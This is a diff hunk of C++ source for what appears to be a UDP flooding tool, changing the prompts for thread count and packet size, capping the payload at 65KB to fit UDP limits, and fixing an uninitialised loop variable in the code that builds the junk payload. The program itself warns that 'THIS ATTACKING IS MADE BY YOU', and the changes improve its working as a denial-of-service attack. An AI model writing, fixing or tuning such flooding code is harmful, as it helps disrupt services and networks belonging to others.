@@ -56,12 +56,12 @@ int main() {
     cout << "WARNING: THIS ATTACKING IS MADE BY YOU! PLEASE DO THIS WITH YOUR OWN RISK!\nIF YOU NEED CANCEL THIS PLEASE PRESS CTRL+C FOR CLOSE THIS PROGRAM.\n";
     cout << "Threads: ";
     cin >> threads;
-    cout << "KB (Recommendeds: 512): ";
+    cout << "Due to Limited of UDP Payloads, We know only C++ UDP allowed only 65KB (65507 bytes) than 65kb that will got -1 bytes.\nAlso If that won't start, just put a kb again.\n";
+    cout << "KB (MAX: 65): ";
     cin >> kb;
-    cout << "\nAsking again: KB (Recommendeds: 512): ";
     cin >> kb;
     cout << "\nGenerating KB (Size)....\n";
-for (int i; i < 1024 * kb; i++){
+for (int i = 0; i < 1024 * kb; i++){
 msg = msg + "x"; // DO NOT DOUBLE IT OR CHANGE IT BECAUSE THAT MAYBE BROKEN BYTE OF PACKET TO -1 BYTES!
 }
     cout << "Creating task...\n";
